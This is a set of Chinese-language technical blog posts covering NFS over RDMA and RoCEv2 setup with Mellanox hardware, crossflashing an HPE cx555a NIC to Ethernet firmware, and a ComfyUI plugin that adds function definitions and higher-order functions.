[{"title":"Mellanox Connect-X 5 网卡 SN2700 交换机 NFS Over RDMA (RoCEv2) 配置指北","path":"/2026/1/19/NFS-Over-RDMA/","content":"目前 CX555 网卡和 SN2700 交换机的价格已经能让 100G 以太网走进寻常百姓家。配置 RoCEv2 和 NFS Over RDMA 其实并不复杂，但网上的资料比较零散，而且有些已经过时。本文记录一下我个人的配置经验，供大家参考。 环境 网卡：所有服务器使用 Mellanox ConnectX-5 EN 网卡（本例中使用 惠普版 cx555a） 交换机：Mellanox Spectrum SN2700，运行 NVIDIA Onyx OS 3.10.4006 存储服务器：Proxmox VE 9.1.4，内核 6.17.4-1-pve。别用 Truenas SCALE，Truenas SCALE 的 NFS Over RDMA 特性只在付费版本中支持 客户端服务器：Ubuntu 22.04 LTS，使用 HWE 内核 6.8.0-90-generic。建议从 Ubuntu 22.04 的 GA 内核升级到 HWE 内核，从 5.15 升级到 6.8 补充了相当多的 NFS 相关特性和修复 交换机配置 需要在交换机上启用 RoCEv2 相关特性。请参阅官方文档 https://enterprise-support.nvidia.com/s/article/recommended-network-configuration-examples-for-roce-deploymenthttps://enterprise-support.nvidia.com/s/article/recommended-network-configuration-examples-for-roce-deployment 自从 Onyx OS 3.8.2008 版本起，交换机自带了 roce 命令，可以一键启用 RoCEv2 特性。使用 SSH 或 Console 登陆交换机命令行，执行以下命令： 1234enableconfigure terminalrocewrite memory 即可自动应用 PFC，ECN，DSCP，DCBX 等相关配置。在交换机和网卡侧都启用 DCBX 特性后，网卡会自动与交换机协商 PFC 和 ETS 配置，无需手动配置。在交换机上运行 show roce 命令可以查看自动应用的 RoCEv2 配置模版： 1234567891011121314151617181920212223242526272829303132333435RoCE mode : losslessLLDP : enabledPort trust mode: L3Application TLV: Selector: udp Protocol: 4791 Priority: 3Port congestion-control: Mode : ecn, absolute Min (KB): 150 Max (KB): 1500PFC : enabledswitch-priority 3: enabledRoCE used TCs: ---------------------------------------------- Switch-Priority TC Application ETS ---------------------------------------------- 3 3 RoCE WRR 50% 6 6 CNP Strict RoCE buffer pools: ---------------------------------------------------------------------------------------------- Traffic Type Memory Switch Memory actual Usage Max Usage Pool [%] Priorities ---------------------------------------------------------------------------------------------- lossy-default lossy auto 0, 1, 2, 4, 3.6M 0 47.1K 5, 6, 7 roce-reserved lossless auto 3 3.6M 0 1.8M Exception list:N/A 如果 Exception list 非空，说明当前交换机上有配置与 RoCEv2 冲突。重启交换机可能会清除这些冲突配置，或者直接恢复交换机出厂设置，然后重新应用 roce 命令。 驱动安装 总的来说，我充分地信任 apt 并倾向于使用发行版自带的内核和驱动，或者通过 apt 在线仓库来安装和更新驱动。我不建议使用各种 install.sh 和 make install 脚本，这些东西往往会导致系统变得不可维护，在某次 apt upgrade 之后爆炸。 下面几乎所有命令都需要 root 权限，请根据需要加上 sudo，或直接 sudo -i 切换到 root 用户。 Proxmox VE Proxmox VE 9.1.4 默认使用一个相当新版本的内核（来自 Ubuntu 25.04，6.17.4-1-pve），自带的 mlx5_core 和 mlx5_ib 已经对 RoCEv2 和 NFS Over RDMA 有很好的支持，安装 DOCA_OFED （原 MLNX_OFED，NVIDIA 收购后更名）反而会导致诡异的问题。如果需要使用 DOCA_OFED 内的 Infiniband 相关的用户态工具，可以先安装 DOCA_OFED 后再卸载 dkms 包： 1234567export DOCA_URL=\"https://linux.mellanox.com/public/repo/doca/3.2.0/debian13/x86_64/\"BASE_URL=$([ \"${DOCA_PREPUBLISH:-false}\" = \"true\" ] &amp;&amp; echo https://doca-repo-prod.nvidia.com/public/repo/doca || echo https://linux.mellanox.com/public/repo/doca)DOCA_SUFFIX=${DOCA_URL#*public/repo/doca/}; DOCA_URL=\"$BASE_URL/$DOCA_SUFFIX\"curl $BASE_URL/GPG-KEY-Mellanox.pub | gpg --dearmor &gt; /etc/apt/trusted.gpg.d/GPG-KEY-Mellanox.pubecho \"deb [signed-by=/etc/apt/trusted.gpg.d/GPG-KEY-Mellanox.pub] $DOCA_URL ./\" &gt; /etc/apt/sources.list.d/doca.listsudo apt-get updatesudo apt-get -y install doca-networking 卸载多余的 dkms 驱动包 1apt-get -y remove --purge isert-dkms mlnx-ofed-kernel-dkms iser-dkms knem-dkms srp-dkms 其中 kernel-mft-dkms 包可以保留，它不与内核自带的驱动冲突，并且我们需要用到 MFT 功能。 另外，在 PVE 上也 不要 安装 mlnx-nfsrdma-dkms 包，装了会出问题。 关于我是怎么发现这个问题的：我配了两台 PVE 服务器做测试，一开始都安装了 doca-networking，结果先装的那台服务器装成了 Debian 的内核头文件 linux-headers-amd64，而不是 PVE 内核的头文件 proxmox-default-headers，导致 dkms 驱动实际上没装上，后面那台服务器装对了头文件。结果第一台服务器能用，第二台服务器有 dmesg 报错 1infiniband mlx5_0: create_qp:3317:(pid 4751): Create QP type 2 failed 才发现在 PVE 上不需要 doca 的 dkms 驱动，卸载掉就好了。 Ubuntu 22.04 首先查看内核版本 1uname -r 如果还在 5.15 内核上，建议升级到 HWE 内核（6.8 版本），内核从 5.15 升级到 6.8 补充了相当多的 NFS 相关特性和修复 12apt updateapt install --install-recommends linux-generic-hwe-22.04 如果需要管理大量服务器，建议创建 udev 规则来统一所有机器上 Mellanox 网卡的设备命名： 1vim /etc/udev/rules.d/70-persistent-net.rules 根据网卡 mac 地址添加 udev 规则，例如： 1SUBSYSTEM==\"net\", ACTION==\"add\", ATTRS{address}==\"94:40:c9:xx:xx:xx\", NAME=\"mce0\" mce0 这个命名大概来自于某些 BSD 系统对 Mellanox 网卡的命名习惯，可以根据个人喜好修改 与 Proxmox VE 不同，在 Ubuntu 22.04 上需要安装完整的 DOCA_OFED 套件： 1234567export DOCA_URL=\"https://linux.mellanox.com/public/repo/doca/3.2.0/ubuntu22.04/x86_64/\"BASE_URL=$([ \"${DOCA_PREPUBLISH:-false}\" = \"true\" ] &amp;&amp; echo https://doca-repo-prod.nvidia.com/public/repo/doca || echo https://linux.mellanox.com/public/repo/doca)DOCA_SUFFIX=${DOCA_URL#*public/repo/doca/}; DOCA_URL=\"$BASE_URL/$DOCA_SUFFIX\"curl $BASE_URL/GPG-KEY-Mellanox.pub | gpg --dearmor &gt; /etc/apt/trusted.gpg.d/GPG-KEY-Mellanox.pubecho \"deb [signed-by=/etc/apt/trusted.gpg.d/GPG-KEY-Mellanox.pub] $DOCA_URL ./\" &gt; /etc/apt/sources.list.d/doca.listsudo apt-get updatesudo apt-get -y install doca-networking DOCA 3.2.1 在 Ubuntu 22.04 上有一些问题，需要同时安装 gcc-12 包才能成功编译内核模块。上面用的是 DOCA 3.2.0，暂时没有这个问题。 安装完成后重启服务器，主要目的是应用 udev 规则来统一网卡命名。 IP 和 QoS 配置 首先启用网卡的硬件 DCBX 特性： 12mst startmlxconfig -d /dev/mst/mt4119_pciconf0 s LLDP_NB_DCBX_P1=TRUE LLDP_NB_TX_MODE_P1=2 LLDP_NB_RX_MODE_P1=2 如果网卡设备不是 /dev/mst/mt4119_pciconf0，请使用 mst status 命令查看正确的设备路径 配置后需要重启服务器才能生效，可以等到后续配完再重启。理论上用下面的命令能免重启重置网卡 1mlxfwreset -d /dev/mst/mt4119_pciconf0 r 接下来配置网卡的 IP 地址和 QoS。交换机自带的 RoCEv2 配置模版中不使用 VLAN，我们可以直接在网卡上配置普通的 IP 地址。不同的系统需要用不同的方法持久化配置并触发 QoS 设置脚本 NetworkManager (Ubuntu Desktop) Ubuntu 22.04 自带 netplan 和 NetworkManager，建议使用 netplan 编写配置文件。编辑 1vim /etc/netplan/01-network-manager-all.yaml 写入 12345678910network: version: 2 renderer: NetworkManager ethernets: mce0: addresses: - 192.168.6.101/24 # 根据实际情况修改 IP 地址 dhcp4: no mtu: 9000 # 可以添加更多网卡的配置 并确保文件权限正确 1chmod 600 /etc/netplan/01-network-manager-all.yaml 写入 Post Up 脚本来补充 QoS 设置（Ubuntu 的 NetworkManager 自带一个 shim 脚本来兼容 ifupdown 的脚本）： 1vim /etc/network/if-up.d/mlnx-roce-qos 写入以下内容： 123456789#!/bin/bashcase \"$IFACE\" in mce0) echo 106 &gt; /sys/class/infiniband/mlx5_0/tc/1/traffic_class cma_roce_tos -d mlx5_0 -t 106 sysctl -w net.ipv4.tcp_ecn=1 ;;esac 保存后赋予可执行权限： 1chmod +x /etc/network/if-up.d/mlnx-roce-qos 使用下面的命令应用 netplan 配置： 1netplan try 出现提示后按回车确认应用配置。 systemd-networkd (Ubuntu Server) 仍然是编辑 netplan 配置文件 1vim /etc/netplan/99-static-mce0.yaml 写入 12345678network: version: 2 ethernets: mce0: addresses: - 192.168.6.102/24 dhcp4: no mtu: 9000 保存后赋予正确权限 1chmod 600 /etc/netplan/99-static-mce0.yaml 写入 systemd-networkd dispather 脚本的 routable 事件来补充 QoS 设置： 1vim /etc/networkd-dispatcher/routable.d/mlnx-roce-qos 写入以下内容： 123456789#!/bin/bashcase \"$IFACE\" in mce0) echo 106 &gt; /sys/class/infiniband/mlx5_0/tc/1/traffic_class cma_roce_tos -d mlx5_0 -t 106 sysctl -w net.ipv4.tcp_ecn=1 ;;esac 保存后赋予可执行权限： 1chmod +x /etc/networkd-dispatcher/routable.d/mlnx-roce-qos 使用下面的命令应用 netplan 配置： 1netplan try 出现提示后按回车确认应用配置。 ifupdown (Proxmox VE) 在 Proxmox VE 的 Web 面板中就可以配置静态 IP 地址并把 MTU 设置为 9000（在高级选项中）。不建议直接编辑 /etc/network/interfaces 文件，因为 PVE 会在 Web 面板中覆盖这个文件。 写入 if-up 脚本来补充 QoS 设置： 1vim /etc/network/if-up.d/mlnx-roce-qos 写入以下内容： 123456789#!/bin/bashcase \"$IFACE\" in mce0) # 根据实际情况修改网卡名称 echo 106 &gt; /sys/class/infiniband/mlx5_0/tc/1/traffic_class cma_roce_tos -d mlx5_0 -t 106 sysctl -w net.ipv4.tcp_ecn=1 ;;esac 保存后赋予可执行权限： 1chmod +x /etc/network/if-up.d/mlnx-roce-qos 应用配置： 1ifdown mce0 &amp;&amp; ifup mce0 RoCEv2 测试 到现在重启服务器，理论上 RoCEv2 就能通信了。做一些基本的检查： 1mlnx_qos -i mce0 关键是确认 DCBX Mode 是 Firmware Controlled。刚刚开机后可能还没有接受到具体的 DCBX 配置，可以等几分钟再检查一次，正确的输出应该类似于： 12345678910111213141516171819202122232425262728DCBX mode: Firmware controlledPriority trust state: dscpdscp2prio mapping: prio:0 dscp:07,06,05,04,03,02,01,00, prio:1 dscp:15,14,13,12,11,10,09,08, prio:2 dscp:23,22,21,20,19,18,17,16, prio:3 dscp:31,30,29,28,27,26,25,24, prio:4 dscp:39,38,37,36,35,34,33,32, prio:5 dscp:47,46,45,44,43,42,41,40, prio:6 dscp:55,54,53,52,51,50,49,48, prio:7 dscp:63,62,61,60,59,58,57,56,Receive buffer size (bytes): 130944,130944,0,0,0,0,0,0,max_buffer_size=262016Cable len: 7PFC configuration: priority 0 1 2 3 4 5 6 7 enabled 0 0 0 1 0 0 0 0 buffer 0 0 0 1 0 0 0 0 tc: 0 ratelimit: unlimited, tsa: ets, bw: 50% priority: 0 priority: 1 priority: 2 priority: 4 priority: 5 priority: 7tc: 3 ratelimit: unlimited, tsa: ets, bw: 50% priority: 3tc: 6 ratelimit: unlimited, tsa: vendor priority: 6 可以看到已经自动设置了 PFC 和 ETS。 下一步查看 show_gids 输出，确认 RoCEv2 GID 已经分配： 1show_gids 正确的输出能够看到有 IPv4 地址的行： 12345678DEV PORT INDEX GID IPv4 VER DEV--- ---- ----- --- ------------ --- ---mlx5_0 1 0 fe80:0000:0000:0000:9640:c9ff:fe8c:a09c v1 mce0mlx5_0 1 1 fe80:0000:0000:0000:9640:c9ff:fe8c:a09c v2 mce0mlx5_0 1 2 0000:0000:0000:0000:0000:ffff:c0a8:0684 192.168.6.132 v1 mce0mlx5_0 1 3 0000:0000:0000:0000:0000:ffff:c0a8:0684 192.168.6.132 v2 mce0mlx5_1 1 0 fe80:0000:0000:0000:9440:c9ff:ff8c:a09d v1n_gids_found=5 如果没有看到 IPv4 地址的行，但 ip a 能看到网卡有正确的 IP 地址，可能网络管理器和 rdma-ndd.service 服务的启动顺序有问题。rdma-ndd.service 应当在网卡 link up 之前启动。尽管一般情况下网络管理器声明为在 rdma-ndd.service 之后启动（After=network-pre.target），但 rdma-ndd.service 只有在网卡的 infiniband 驱动加载后才会被 udev 规则触发，这就可能导致 rdma-ndd.service 在网卡 link up 之后才启动，修起来感觉比较麻烦。如果确认是这个问题，重新 link up 可以解决： 12ip link set dev mce0 downip link set dev mce0 up 再次运行 show_gids，应该就能看到 IPv4 地址的行了。 Systemd 服务依赖顺序问题的解决思路systemd 的服务依赖顺序有时会比较难以控制，尤其是当服务的启动时机依赖于硬件状态（如网卡 link up）时。解决这个问题的一种思路是创建一个自定义的 systemd 服务单元，专门在启动阶段的最后重新把网卡 link down 然后 link up. 创建 /etc/systemd/system/fix-roce-networkmanager.service 文件，写入以下内容：123456789101112131415[Unit]Description=Fix RDMA mce0 link flapping after bootAfter=network-online.target rdma-ndd.service NetworkManager.service multi-user.targetWants=network-online.target[Service]Type=oneshotExecStart=/usr/bin/sleep 2ExecStart=/usr/sbin/ip link set mce0 downExecStart=/usr/bin/sleep 1ExecStart=/usr/sbin/ip link set mce0 upRemainAfterExit=yes[Install]WantedBy=multi-user.target并启用该服务：12systemctl daemon-reloadsystemctl enable fix-roce-networkmanager.service 接下来可以运行 ib_write_bw 来测个速。在一边运行 1ib_write_bw --report_gbits 在另一边运行（双向传输，测试 5 秒钟，目标 IP 地址根据实际情况修改）： 1ib_write_bw -b -D 5 --report_gbits 192.168.6.106 看到这个结果就是接近跑满 100GbE 了（最下面一栏 BW average）： 123456789101112131415161718192021222324252627WARNING: BW peak won't be measured in this run.--------------------------------------------------------------------------------------- RDMA_Write Bidirectional BW Test Dual-port : OFF Device : mlx5_0 Number of qps : 1 Transport type : IB Connection type : RC Using SRQ : OFF PCIe relax order: ON Lock-free : OFF ibv_wr* API : ON Using Enhanced Reorder : OFF TX depth : 128 CQ Moderation : 1 CQE Poll Batch : Dynamic Mtu : 4096[B] Link type : Ethernet GID index : 4 Max inline data : 0[B] rdma_cm QPs : OFF Data ex. method : Ethernet--------------------------------------------------------------------------------------- local address: LID 0000 QPN 0x008a PSN 0xfffb6d RKey 0x238f86 VAddr 0x007dd5a3cfd000 GID: 00:00:00:00:00:00:00:00:00:00:255:255:192:168:06:116 remote address: LID 0000 QPN 0x008a PSN 0xaa095c RKey 0x202129 VAddr 0x0074c6b5900000 GID: 00:00:00:00:00:00:00:00:00:00:255:255:192:168:06:106--------------------------------------------------------------------------------------- #bytes #iterations BW peak[Gb/sec] BW average[Gb/sec] MsgRate[Mpps]Conflicting CPU frequency values detected: 1500.000000 != 3300.016000. CPU Frequency is not max. 65536 560845 0.00 98.02 0.186950--------------------------------------------------------------------------------------- 如果差的比较多，检查网卡是否降级到了 PCIE 3.0 x8 链接，这样带宽会被限制在 50Gbps 左右： 1dmesg | grep -i mlx5 这个输出就是被 PCIE 卡脖子了： 123456[ 8.387515] mlx5_core 0001:43:00.0: firmware version: 16.35.4030[ 8.387840] mlx5_core 0001:43:00.0: 63.008 Gb/s available PCIe bandwidth, limited by 8.0 GT/s PCIe x8 link at 0001:42:01.0 (capable of 126.016 Gb/s with 8.0 GT/s PCIe x16 link)[ 8.856776] mlx5_core 0001:43:00.0: E-Switch: Total vports 18, per vport: max uc(128) max mc(2048)[ 8.866780] mlx5_core 0001:43:00.0: Flow counters bulk query buffer size increased, bulk_query_len(8)[ 8.881967] mlx5_core 0001:43:00.0: Port module event: module 0, Cable plugged[ 8.883192] mlx5_core 0001:43:00.0: mlx5_pcie_event:334:(pid 11): PCIe slot advertised sufficient power (27W). NFS Over RDMA 配置 如果把以上的 RoCEv2 配置都做好了，NFS Over RDMA 的配置就非常简单了。首先，客户端和服务端都加大 rpc 条目表来提升性能： 123echo \"options sunrpc tcp_slot_table_entries=128\" &gt;&gt; /etc/modprobe.d/sunrpc.confecho \"options sunrpc tcp_max_slot_table_entries=128\" &gt;&gt; /etc/modprobe.d/sunrpc.confsysctl -w sunrpc.tcp_slot_table_entries=128 服务端 在 Proxmox VE 上安装 NFS 服务器组件： 12apt updateapt install nfs-kernel-server nfs-common 实测 Proxmox VE 自带的 NFS 服务器组件已经支持 NFS over RDMA，无需额外安装 mlnx-nfsrdma-dkms 包，装了会出问题。 如果使用 ZFS，可直接通过 ZFS 生成 NFS 导出： 1zfs set sharenfs='rw=@192.168.4.0/22,rw=@192.168.123.0/24,async,no_subtree_check,all_squash,anonuid=999,anongid=10000' poolname/dataset 简要说明一下这一串参数： rw=@192.168.4.0/22 允许读写访问的 IP 段，可以添加多个 async 启用异步写入以提升性能 no_subtree_check 禁用子树检查以提升性能 all_squash,anonuid=999,anongid=10000 将所有客户端的用户映射为 999:10000 用户，防止不同机器上 uid 和 gid 不一致导致权限问题。你可以根据需要修改为其他 uid 和 gid。简单起见，可以将挂载点给 chown 成这个用户，并 chown 2755. 在这个配置下，还可以在 NFS 服务器上用 root 用户创建所有者为 root 的文件，从而实现客户端只能读取但不能修改的效果。 也许在 PVE 主机上使用 100000:100000 也是个好主意，这是非特权 PCT 容器和 virtiofs 的默认映射用户 如果不使用 ZFS，可以手动编辑 /etc/exports 文件来添加 NFS 导出： 1/mnt/data 192.168.4.0/22(rw,sync,no_subtree_check,all_squash,anonuid=999,anongid=10000) 192.168.123.0/24(rw,sync,no_subtree_check,all_squash,anonuid=999,anongid=10000) 修改 nfs.conf 来启用 RDMA 支持： 1vim /etc/nfs.conf 修改其中的 [nfsd] 段，启用 rdma： 12345678910111213141516[nfsd]# debug=0# threads=16# host=# port=0# grace-time=90# lease-time=90# udp=ntcp=y# vers3=y# vers4=y# vers4.0=y# vers4.1=y# vers4.2=yrdma=yrdma-port=20049 20049 是 NFS over RDMA 的默认端口，可以根据需要修改。 重启 NFS 服务： 1systemctl restart nfs-server 理论上不需要手动加载任何内核模块，该加载的自己会加载。 客户端 需要额外安装 mlnx-nfsrdma-dkms 包来启用 NFS over RDMA 支持： 12apt updateapt install mlnx-nfsrdma-dkms nfs-common 临时使用 mount 命令挂载 NFS over RDMA： 12mkdir -p /mnt/nfs_rdmamount -t nfs -o rdma,port=20049,vers=4.2,nconnect=16 &lt;server_ip&gt;:/poolname/dataset /mnt/nfs_rdma 将 &lt;server_ip&gt; 替换为 NFS 服务器的 IP 地址，/poolname/dataset 替换为实际的导出路径。执行命令行即可访问挂载点中的文件。 通过 /etc/fstab 来持久化挂载配置，并添加更多优化性能的参数： 1vim /etc/fstab 添加一行： 1&lt;server_ip&gt;:/poolname/dataset /mnt/nfs_rdma noauto,rdma,port=20049,vers=4.2,nconnect=16,rsize=1048576,wsize=1048576,hard,proto=rdma,timeo=600,retrans=2,noatime,nodiratime,actimeo=60,x-systemd.automount,x-systemd.idle-timeout=600,x-systemd.mount-timeout=30,_netdev 0 0 这里还使用了 systemd 的自动挂载功能（x-systemd.automount），避免开机时因为网络未就绪而导致挂载失败的问题。 注释 从内核 5.15 起，nfs 客户端支持对同一服务器共享连接，创建 rdma 协议挂载点后，原有的 tcp 协议挂载点会自动升级为 rdma 协议 从内核 5.18 起，内核支持跨挂载点创建 reflink 链接，也支持通过 nfs 创建底层 zfs 的 reflink 链接。但由于 linux 内核仍未解除对跨 superblock reflink 的限制，尽管 zfs 本身支持跨 dataset 的 block clone，linux 上无法跨越 zfs dataset 创建 reflink 链接。参见 OpenZFS 讨论 RDMA 网络流量不经过 CPU 和内核处理，因此无法被常规的流量监控工具（如 iftop, nload）监控到。 Docker 挂载点不能透传 systemd 的自动挂载功能，在上面的例子中，不能使用 docker run -v /mnt:/data 来在容器中访问 /data/nfs_rdma，但是使用 docker run -v /mnt/nfs_rdma:/data 是可以的。","tags":["指北","infra"],"categories":["技术"]},{"title":"HPE cx555a 100G 网卡刷入以太网固件指北","path":"/2025/11/26/HPE-cx555a/","content":"参考文献 https://forums.servethehome.com/index.php?threads/crossflash-oracle-cx556a-to-mellanox-oem.34293/post-463450https://forums.servethehome.com/index.php?threads/crossflash-oracle-cx556a-to-mellanox-oem.34293/post-463450 原理 简而言之，HPE 版本的 cx555a 网卡固件有锁，自带的 HPE 固件不支持以太网模式，只支持 IB 模式，并且只能刷入 HPE 签名的固件而不能刷入 Mellanox 原版固件。但是 cx555a 硬件上和双口的 cx556a 是一样的，HPE 的 cx555a 卡可以刷入 HPE 版本的 cx556a 固件，而 HPE 版本的 cx556a 固件是支持以太网模式的。刷入 cx556a 固件后，系统内识别出两个 100G 网口，但只有一个口在硬件上存在，另一个口没有焊接元件。 操作流程 本例使用超威 H12SSL-i 主板和 Ubuntu 22.04 系统，内核版本 12$ uname -r6.8.0-87-generic 短接位置 用订书钉或者回形针把红框内 FNP/JP2 焊点短接，进入固件恢复模式 装机并上电，此时网口旁边会有黄色 LED 常亮，表示进入固件恢复模式 此时运行 lspci 命令，可以看见 ConnectX-5 Flash Recovery 设备 12$ lspci | grep Mellanox81:00.0 Memory controller: Mellanox Technologies MT28800 Family [ConnectX-5 Flash Recovery] 下载并安装 Mellanox 官方最新版 MFT 工具 1234567# 下载 MFT 工具wget https://www.mellanox.com/downloads/MFT/mft-4.34.0-145-x86_64-deb.tgz# 解压tar -xzf mft-4.34.0-145-x86_64-deb.tgz# 安装cd mft-4.34.0-145-x86_64-debsudo bash install.sh 此时应该可以通过 mst 命令看到设备 1234567891011121314151617$ sudo mst startStarting MST (Mellanox Software Tools) driver setLoading MST PCI module - SuccessLoading MST PCI configuration module - SuccessCreate devicesUnloading MST PCI module (unused) - Success$ sudo mst statusMST modules:------------ MST PCI module is not loaded MST PCI configuration module loadedMST devices:------------/dev/mst/mt525_pciconf0 - PCI configuration cycles access. domain:bus:dev.fn=0000:81:00.0 addr.reg=88 data.reg=92 cr_bar.gw_offset=-1 Chip revision is: 00 下载并解压最新 HPE 版本的 cx556a 固件 12curl -fL -o \"fw-ConnectX5-rel-16_35_4030-872726-B21_Ax_Bx-UEFI-14.29.15-FlexBoot-3.6.902.tar.gz\" https://downloads.hpe.com/pub/softlib2/software1/pubsw-linux/p1133476375/v253748/fw-ConnectX5-rel-16_35_4030-872726-B21_Ax_Bx-UEFI-14.29.15-FlexBoot-3.6.902.tar.gztar -xzf fw-ConnectX5-rel-16_35_4030-872726-B21_Ax_Bx-UEFI-14.29.15-FlexBoot-3.6.902.tar.gz 使用 MFT 工具刷入固件，设备路径参考上面 mst status 命令的输出 1sudo flint -d /dev/mst/mt525_pciconf0 -i fw-ConnectX5-rel-16_35_4030-872726-B21_Ax_Bx-UEFI-14.29.15-FlexBoot-3.6.902.signed.bin -allow_psid_change burn 确认修改 PSID： 12345678910111213141516Done. Current FW version on flash: 16.30.1004 New FW version: 16.35.4030 You are about to replace current PSID on flash - \"HPE0000000008\" with a different PSID - \"HPE0000000009\". Note: It is highly recommended not to change the PSID. Do you want to continue ? (y/n) [n] : yBurning FW image without signatures - OK Burning FW image without signatures - OK -W- Failed to update FW boot address. Power cycle the device in order to load the new FW. Restoring signature - OK-I- To load new FW, issue system-level reset. 刷入固件大约需要一分钟时间。 刷入完成后，断电 (否则不会退出固件恢复模式)，取下短接焊点，重新上电开机 此时 lspci 命令可以看到两个 IB 设备 123$ lspci | grep \"Mellanox\"81:00.0 Infiniband controller: Mellanox Technologies MT27800 Family [ConnectX-5]81:00.1 Infiniband controller: Mellanox Technologies MT27800 Family [ConnectX-5] 使用 mlxconfig 把第一个口改成以太网模式，第二个口物理上不存在，保持 IB 模式即可 1sudo mlxconfig -d 0000:81:00.0 set LINK_TYPE_P1=2 LINK_TYPE_P1=2 表示以太网模式，LINK_TYPE_P1=1 表示 IB 模式。 重启后，第一个口变成以太网口，使用 ip a 命令可以看到它 123$ ip a5: enp129s0f0np0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc mq state DOWN group default qlen 1000 link/ether 94:40:c9:xx:xx:xx brd ff:ff:ff:ff:ff:ff 也可以使用 ethtool 命令查看网口信息 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748$ sudo ethtool enp129s0f0np0Settings for enp129s0f0np0: Supported ports: [ ] Supported link modes: 1000baseKX/Full 10000baseKR/Full 40000baseKR4/Full 40000baseCR4/Full 40000baseSR4/Full 40000baseLR4/Full 25000baseCR/Full 25000baseKR/Full 25000baseSR/Full 50000baseCR2/Full 50000baseKR2/Full 100000baseKR4/Full 100000baseSR4/Full 100000baseCR4/Full 100000baseLR4_ER4/Full Supported pause frame use: Symmetric Supports auto-negotiation: Yes Supported FEC modes: None RS BASER Advertised link modes: 1000baseKX/Full 10000baseKR/Full 40000baseKR4/Full 40000baseCR4/Full 40000baseSR4/Full 40000baseLR4/Full 25000baseCR/Full 25000baseKR/Full 25000baseSR/Full 50000baseCR2/Full 50000baseKR2/Full 100000baseKR4/Full 100000baseSR4/Full 100000baseCR4/Full 100000baseLR4_ER4/Full Advertised pause frame use: Symmetric Advertised auto-negotiation: Yes Advertised FEC modes: Not reported Speed: Unknown! Duplex: Unknown! (255) Auto-negotiation: on Port: Other PHYAD: 0 Transceiver: internal Supports Wake-on: d Wake-on: d Link detected: no (No cable)","tags":["指北","infra"],"categories":["技术"]},{"title":"在 ComfyUI 中优雅地函数式编程","path":"/2025/9/25/ComfyUI-Functional/","content":"我给 ComfyUI 写了一个插件 ComfyUI-Functional，能让你在 ComfyUI 的节点图中直观地定义函数，实现在工作流中复用流程，还能多次地、动态地调用函数，从而以函数式编程的形式直观地实现循环、递归等复杂控制结构，构建图灵完备的工作流。 非常建议将本节点包与 Basic Data Handling 搭配使用，这个节点包提供了大量 Python 基本数据类型的节点，能让你在 ComfyUI 中更方便地编程。 定义函数 定义函数非常简单。只需要在节点图中添加 Function Parameter 节点和 Function End 节点，它们分别表示函数的参数和返回值，它们之间的节点就构成了函数体。 定义一个 x + 1 函数 函数可以有多个参数，但只能有一个返回值。定义具有多个输入参数的函数时，给 Function Parameter 增加编号来区分不同的参数。 提示函数只能有一个返回值的限制是因为在 ComfyUI 的 Python 代码中很难声明输出数量可变的节点。如果你需要返回多个值，可以把它们打包成一个 LIST。 定义 x + y 函数 下面是一个更实际的例子，我们将 ComfyUI 的官方 Flux Fill 模型工作流封装成一个函数，具有两个输入参数，分别是待 Inpaint 的图像和 Mask，返回值是 Inpaint 后的图像。 Inpaint 函数 提示可以在函数里使用不依赖于 Function Parameter 的节点，这些节点只会在函数定义时执行一次，并在函数调用时复用它们的输出。这样就可以在函数里使用加载的模型，或者固定的文本 Condition 等，就像在普通工作流中使用它们一样。 提示可以双击修改 Function Parameter 节点的标题，备注参数的含义。 调用函数 定义函数后函数不会立刻运行，Function End 节点的输出是一个函数对象，需要使用 Call Function 节点来调用它。 提示如果立刻运行上面例子里的工作流，就会产生一个 “Prompt has no outputs” 错误。 将 Function End 节点的输出连接到 Call Function 节点的 Function 输入端口，然后依次连接参数，就可以从 Call Function 节点的输出端口获得函数的返回值。 调用 x + 1 函数 Call Function 节点可以连接任意数量的函数输入端口，要调用具有多个参数的函数，只需要依次连接所有参数即可。 调用 x / y 函数 函数很有用的地方在于，可以在工作流中多次调用同一个函数，从而复用节点图。下面的例子两次调用了 函数。 在工作流中复用函数 在函数里也可以调用别的函数，从而实现更复杂的功能。下面的例子先定义了 , 然后定义了 , 最后调用了 得到结果 5. 在函数中调用其他函数 高级技巧：递归函数甚至可以实现递归的函数调用！只需要把函数对象本身作为参数传入 Call Function 节点即可。下面的例子定义了这个函数：递归调用函数计算 的结果是 7.使用递归函数时，要非常小心地设置终止条件，以免造成无限递归。尽管递归函数结合 if/else 节点就可以实现图灵完备的计算，使用下面介绍的高阶函数来实现循环通常会更简单、更安全。 使用高阶函数 这个节点包通过高阶函数的形式实现循环和复杂控制结构，这比其他节点包采用的形式更加直观和通用，确保工作流可以通过 API 调用在无需额外交互的情况下运行。 高阶函数是指以函数作为输入或输出的函数。ComfyUI-Functional 提供了几个常用的高阶函数节点，能让你更方便地实现循环等复杂控制结构。 重要提示使用本节点包的函数处理数组时，请务必使用 Basic Data Handling 节点包提供的 LIST 数据类型来传递列表，而不要使用 ComfyUI 自带的 Data List 功能！将 Data List 作为函数的参数和返回值会导致不可预期的错误或卡顿，且由于 ComfyUI 的限制，目前暂时无法检测到这种错误。你可以使用 Basic Data Handling 节点包的 convert to Data List 和 convert to LIST 节点在 LIST 和 Data List 之间转换。 Map 高阶函数 将 Function End 节点产生的函数对象传给各类高阶函数就可以轻松对列表应用函数，或者实现迭代计算。目前内置了八个 Mathematica 风格的高阶函数，分别是： 高阶函数 作用 解释 Comap Comap[{f, g, h}, x] := {f[x], g[x], h[x]} 将多个函数应用于同一个输入，例如比较不同方法对相同输入的效果 Fold Fold[f, x, {a, b, c}] := f[f[f[x, a], b], c] 从左到右迭代地将函数应用于列表元素，类似于 Python 的 functools.reduce Map Map[f, {a, b, c}] := {f[a], f[b], f[c]} 将函数应用于列表的每个元素，类似于 Python 的 map MapIndexed MapIndexed[f, {a, b, c}] := {f[a, 1], f[b, 2], f[c, 3]} 将函数应用于列表的每个元素，并传入元素的索引作为第二个参数 Nest Nest[f, x, n] := f(f(...f(x)...)) (n 次) 将函数迭代地应用于初始值 n 次 NestWhile NestWhile[f, x, p] 迭代地将函数应用于初始值，直到不满足条件 p (p[x] 是返回 BOOLEAN 值的函数)，可以实现 While 循环 Select Select[p, {a, b, c}] := {x | x ∈ {a, b, c}, p[x]} 选择列表中满足条件的元素，类似于 Python 的 filter TakeWhile TakeWhile[p, {a, b, c}] := {a, b, ..., y} (直到 p[y] 为 False) 从列表开头开始选择元素，直到遇到第一个不满足条件的元素为止 结合高阶函数，在工作流中实现流程控制非常容易。 